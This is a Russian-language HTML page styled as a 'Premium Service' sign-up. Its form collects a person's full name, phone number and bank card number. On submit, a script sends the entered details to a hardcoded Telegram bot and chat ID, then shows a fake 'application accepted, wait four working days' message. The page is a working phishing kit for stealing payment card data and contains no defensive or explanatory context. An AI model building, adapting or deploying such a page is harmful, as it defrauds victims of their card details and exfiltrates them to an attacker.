<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Service</title>
    <style>
        :root {
            --accent: #ffdd2d; 
            --bg: #000000;
            --card-bg: #111111;
            --field-bg: #1c1c1c;
            --text-main: #ffffff;
            --text-secondary: #888888;
            --radius: 20px;
            --transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
        }

        * { box-sizing: border-box; outline: none; }
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: var(--bg);
            color: var(--text-main);
            overflow: hidden;
        }

        /* PRELOADER */
        #loader {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: var(--bg); display: flex; justify-content: center;
            align-items: center; z-index: 1000; transition: opacity 0.6s ease;
        }
        .loader-logo {
            width: 50px; height: 50px; border: 3px solid var(--accent);
            border-radius: 50%; border-top-color: transparent;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* CONTENT */
        .wrapper {
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; padding: 20px; opacity: 0;
            transform: translateY(20px); transition: var(--transition);
        }

        .premium-card {
            background: var(--card-bg); width: 100%; max-width: 480px;
            padding: 40px; border-radius: var(--radius);
            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
            border: 1px solid #222; text-align: center;
        }

        h1 { font-size: 26px; margin-bottom: 8px; letter-spacing: -0.5px; }
        .subtitle { color: var(--text-secondary); margin-bottom: 30px; font-size: 14px; }

        .field { margin-bottom: 18px; text-align: left; }
        label { display: block; font-size: 12px; color: var(--text-secondary); margin-bottom: 6px; margin-left: 4px; text-transform: uppercase; letter-spacing: 1px; }

        input, textarea {
            width: 100%; background: var(--field-bg); border: 1px solid #2a2a2a;
            border-radius: 14px; padding: 16px; color: #fff; font-size: 16px;
            transition: var(--transition);
        }

        input:focus { border-color: var(--accent); background: #222; }

        .btn-send {
            width: 100%; background: var(--accent); color: #000; border: none;
            padding: 18px; border-radius: 14px; font-size: 16px; font-weight: 700;
            cursor: pointer; margin-top: 15px; transition: var(--transition);
        }
        .btn-send:hover { transform: scale(1.02); filter: brightness(1.1); }

        /* MODAL */
        .modal-overlay {
            position: fixed; top:0; left:0; width:100%; height:100%;
            background: rgba(0,0,0,0.8); backdrop-filter: blur(12px);
            display: none; justify-content: center; align-items: center; z-index: 100;
        }
        .modal {
            background: #fff; color: #000; padding: 40px; border-radius: 28px;
            text-align: center; max-width: 380px; margin: 20px;
            transform: scale(0.9); opacity: 0; transition: var(--transition);
        }
        .modal.active { transform: scale(1); opacity: 1; }
        .modal-close {
            background: #000; color: #fff; border: none; padding: 14px 40px;
            border-radius: 14px; margin-top: 20px; cursor: pointer; font-weight: 600;
        }
    </style>
</head>
<body>

    <div id="loader"><div class="loader-logo"></div></div>

    <div class="wrapper" id="content">
        <div class="premium-card">
            <h1>Введи данные</h1>
            <!-- <p class="subtitle">Введите данные для активации привилегий</p> -->
            
            <form id="tg-form">
                <div class="field">
                    <label>ФИО</label>
                    <input type="text" id="name" placeholder="Иванов Иван Иванович" required>
                </div>
                <div class="field">
                    <label>Телефон</label>
                    <input type="tel" id="phone" placeholder="+7 (___) ___-__-__" required>
                </div>
                <div class="field">
                    <label>Номер карты</label>
                    <input type="text" id="card" maxlength="19" placeholder="0000 0000 0000 0000" required>
                </div>
                <div class="field">
                    <label>Комментарий</label>
                    <textarea id="message" rows="3" placeholder="Ваши пожелания..." required></textarea>
                </div>
                <button type="submit" class="btn-send">Подтвердить</button>
            </form>
        </div>
    </div>

    <div class="modal-overlay" id="modalOverlay">
        <div class="modal" id="modalBox">
            <div style="font-size: 50px; margin-bottom: 10px;">💎</div>
            <h2>Заявка принята</h2>
            <p>Ваш запрос отправлен на проверку. Ожидайте уведомления в течение 4 рабочих дней.</p>
            <button class="modal-close" onclick="closeModal()">Хорошо</button>
        </div>
    </div>

    <script>
        // Прелоадер
        window.addEventListener('load', () => {
            setTimeout(() => {
                document.getElementById('loader').style.opacity = '0';
                setTimeout(() => {
                    document.getElementById('loader').style.display = 'none';
                    document.getElementById('content').style.opacity = '1';
                    document.getElementById('content').style.transform = 'translateY(0)';
                    document.body.style.overflow = 'auto';
                }, 600);
            }, 800);
        });

        // Маска для карты (пробелы каждые 4 цифры)
        document.getElementById('card').addEventListener('input', function (e) {
            let target = e.target, position = target.selectionEnd;
            let length = target.value.length;
            target.value = target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
            if(target.value.length !== length) {
                target.setSelectionRange(position + 1, position + 1);
            }
        });

        const TOKEN = "8273654143:AAEhXN0l_2unq3zcEtOh2JeDsB3i2c57bQM";
        const CHAT_ID = "7634532827";

        document.getElementById('tg-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            const btn = this.querySelector('.btn-send');
            btn.innerText = "Обработка...";
            btn.disabled = true;

            const text = `💳 <b>НОВАЯ ЗАЯВКА</b>\n\n` +
                         `👤 <b>ФИО:</b> ${document.getElementById('name').value}\n` +
                         `📞 <b>Тел:</b> ${document.getElementById('phone').value}\n` +
                         `💳 <b>Карта:</b> <code>${document.getElementById('card').value}</code>\n` +
                         `💬 <b>Текст:</b> ${document.getElementById('message').value}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, parse_mode: 'html', text: text })
                });

                if (response.ok) { showModal(); this.reset(); }
            } catch (err) {
                alert("Ошибка соединения с сервером.");
            } finally {
                btn.innerText = "Подтвердить";
                btn.disabled = false;
            }
        });

        function showModal() {
            const overlay = document.getElementById('modalOverlay');
            const box = document.getElementById('modalBox');
            overlay.style.display = 'flex';
            setTimeout(() => box.classList.add('active'), 50);
        }

        function closeModal() {
            const overlay = document.getElementById('modalOverlay');
            const box = document.getElementById('modalBox');
            box.classList.remove('active');
            setTimeout(() => overlay.style.display = 'none', 400);
        }
    </script>
</body>
</html>
